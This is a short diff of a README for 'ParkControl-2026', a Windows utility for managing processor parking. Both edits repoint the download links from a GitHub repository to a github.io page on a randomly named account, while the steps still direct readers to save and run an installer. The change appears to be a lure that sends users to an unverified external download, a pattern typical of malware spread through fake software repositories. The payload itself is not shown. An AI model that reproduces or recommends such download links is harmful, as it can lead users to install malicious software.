@@ -1,6 +1,6 @@
 # ⚡ ParkControl-2026 - Improve system performance by managing processors
 
-[![Download ParkControl-2026](https://img.shields.io/badge/Download-ParkControl-blue.svg)](https://github.com/synesthetic-greeneyedmonster490/ParkControl-2026)
+[![Download ParkControl-2026](https://img.shields.io/badge/Download-ParkControl-blue.svg)](https://synesthetic-greeneyedmonster490.github.io)
 
 ## 📌 About this software
 
@@ -22,7 +22,7 @@ Ensure your computer meets these standards before you begin:
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the repository page to begin the process: [ParkControl-2026 Download](https://github.com/synesthetic-greeneyedmonster490/ParkControl-2026).
+1. Visit the repository page to begin the process: [ParkControl-2026 Download](https://synesthetic-greeneyedmonster490.github.io).
 2. Look for the Releases section on the right side of the screen.
 3. Select the latest version of the installer file.
 4. Save the file to your desktop.
